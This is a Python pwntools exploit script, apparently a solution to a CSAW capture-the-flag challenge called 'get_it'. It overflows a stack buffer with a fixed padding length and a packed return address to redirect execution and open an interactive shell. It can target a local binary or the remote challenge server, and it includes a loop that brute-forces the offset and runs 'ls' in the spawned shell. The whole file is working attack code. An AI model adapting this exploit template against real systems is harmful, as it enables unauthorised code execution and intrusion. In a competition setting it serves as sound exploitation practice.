#! /usr/bin/env python

from pwn import *

target = p64(0x04005b6)
offset = 0x28


def brute():
	try:
		for i in xrange(0x20, 0x48):
			p = process('./get_it')
			p.sendline("A"*i + target)
			p.sendline("ls -lab")
			p.interactive()
			raw_input("")
			print (i)
	except KeyboardInterrupt:
		p.close()
		exit()



def real():
	p = remote('pwn.chal.csaw.io', 9001)
	# p = process('./get_it')
	p.sendline("A"*offset + target)
	p.interactive()		# keep it alive
	p.close()		# be nice

if __name__ == "__main__":
	real()
